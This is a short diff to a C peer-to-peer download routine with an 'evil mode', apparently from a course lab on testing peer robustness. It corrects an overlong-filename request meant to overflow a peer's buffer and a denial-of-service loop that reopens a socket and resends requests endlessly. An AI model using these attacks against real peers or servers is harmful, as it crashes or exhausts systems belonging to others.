@@ -545,14 +545,16 @@ static void task_download(task_t *t, task_t *tracker_task)
 		//do evil things
 		char evil_buffer[FILENAMESIZ*4];
 		int evil_i;
-		for (evil_i = 0; evil_i < FILENAMESIZ*4; i+=4)
+		for (evil_i = 0; evil_i < FILENAMESIZ*4; evil_i+=4)
 		{
 			evil_buffer[evil_i] = 'e';
-			evil_buffer[evil_i] = 'v';
-			evil_buffer[evil_i] = 'i';
-			evil_buffer[evil_i] = 'l';			
+			evil_buffer[evil_i + 1] = 'v';
+			evil_buffer[evil_i + 2] = 'i';
+			evil_buffer[evil_i + 3] = 'l';			
 		}
 		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evil_buffer);
+		
+		message("evil mode sent evil request");
 	}
 
 	//EVIL2)
@@ -562,7 +564,9 @@ static void task_download(task_t *t, task_t *tracker_task)
 		message("evil mode attempting DOS");
 		while(1)
 		{
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 			osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+			message("evil mode sent evil loop request");
 		}
 	}
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
